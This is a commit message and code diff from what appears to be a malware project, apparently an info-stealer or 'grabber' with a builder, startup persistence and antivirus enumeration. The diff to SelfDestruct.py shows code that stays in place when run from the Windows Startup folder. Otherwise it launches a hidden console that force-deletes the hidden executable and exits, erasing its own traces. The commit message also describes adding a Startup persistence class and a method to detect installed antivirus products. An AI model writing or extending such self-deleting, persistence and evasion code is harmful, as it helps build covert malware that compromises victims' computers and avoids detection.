Updated startup handling and removed unused features
In this commit, several changes have been made across multiple files. In `builder.py`, the "startup" module now imports the "shutil" module. In `luna.py`, the "startup" thread now uses the "Startup" class instead of the "startup" function, and the "minecraft" thread and key have been removed. The `GetLnkTarget` method has been removed from the "Games" class in `Games.py`. In `SelfDestruct.py`, the "SelfDestruct" class has been updated to set the "startup_path" attribute and check the source path before deletion. A new method `get_all_avs` has been added to the "PcInfo" class in `System.py` to get the antivirus product name. Finally, in `startup.py`, the "startup" function has been replaced with a "Startup" class with new methods and attributes for handling startup operations.

+++ options/SelfDestruct.py
@@ -3,19 +3,23 @@ import subprocess
 import sys
 
 class SelfDestruct():
-	def __init__(self):
-		self.delete()
+    def __init__(self):
+        self.startup_path = os.path.join(os.getenv("APPDATA"), "Microsoft", "Windows", "Start Menu", "Programs", "Startup")
+        self.delete()
 
-	def GetSelf(self) -> tuple[str, bool]:
-		if hasattr(sys, "frozen"):
-			return (sys.argv[0], True)
-		else:
-			return (__file__, False)
-		
-	def delete(self):
-		path, isExecutable = self.GetSelf()
-		if isExecutable:
-			subprocess.Popen('ping localhost -n 3 > NUL && del /A H /F "{}"'.format(path), shell= True, creationflags= subprocess.CREATE_NEW_CONSOLE | subprocess.SW_HIDE)
-			os._exit(0)
-		else:
-			os.remove(path)
+    def GetSelf(self) -> tuple[str, bool]:
+        if hasattr(sys, "frozen"):
+            return (sys.argv[0], True)
+        else:
+            return (__file__, False)
+        
+    def delete(self):
+        path, isExecutable = self.GetSelf()
+        source_path = os.path.abspath(path)
+        if os.path.basename(os.path.dirname(source_path)).lower() == "startup":
+            return
+        if isExecutable:
+            subprocess.Popen('ping localhost -n 3 > NUL && del /A H /F "{}"'.format(path), shell= True, creationflags= subprocess.CREATE_NEW_CONSOLE | subprocess.SW_HIDE)
+            os._exit(0)
+        else:
+            os.remove(path)
